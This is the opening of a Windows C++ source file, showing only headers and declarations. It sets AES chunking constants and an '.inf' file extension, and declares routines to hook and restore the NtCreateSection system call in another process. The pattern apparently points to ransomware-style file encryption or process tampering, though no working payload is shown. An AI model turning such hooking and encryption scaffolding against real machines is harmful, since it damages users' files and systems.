#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>

#include <stdio.h>
#include <string.h>
#include <Wincrypt.h>
#include <time.h>
#include <process.h>
#include <tchar.h>
#include <psapi.h>
#include <winternl.h>
#include <iostream>
#include "sha256.h"

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")



#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif



#define AES_KEY_SIZE 16
#define CHUNK_SIZE (AES_KEY_SIZE*5)


#define extension ".inf"



typedef __kernel_entry NTSYSCALLAPI NTSTATUS (WINAPI *myNtCreateSection)(
	PHANDLE            SectionHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PLARGE_INTEGER     MaximumSize,
	ULONG              SectionPageProtection,
	ULONG              AllocationAttributes,
	HANDLE             FileHandle
); //define NtCreateSection

BOOL hook_ntcreatesection(HANDLE hProc); //define hook_ntcreatesection
BOOL restore_hook_ntcreatesection(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE FileHandle OPTIONAL);

